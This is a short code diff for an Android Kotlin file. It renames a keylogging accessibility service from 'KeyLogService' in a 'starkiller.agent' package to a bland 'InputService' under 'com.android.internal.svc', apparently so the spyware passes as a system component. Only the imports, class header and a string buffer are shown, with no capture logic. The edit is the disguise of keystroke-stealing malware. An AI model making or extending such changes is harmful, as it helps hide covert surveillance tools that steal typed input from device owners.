@@ -1,10 +1,10 @@
-package com.starkiller.agent.modules
+package com.android.internal.svc.modules
 
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
 import java.util.concurrent.ConcurrentLinkedQueue
 
-class KeyLogService : AccessibilityService() {
+class InputService : AccessibilityService() {
 
     companion object {
         val buffer = ConcurrentLinkedQueue<String>()
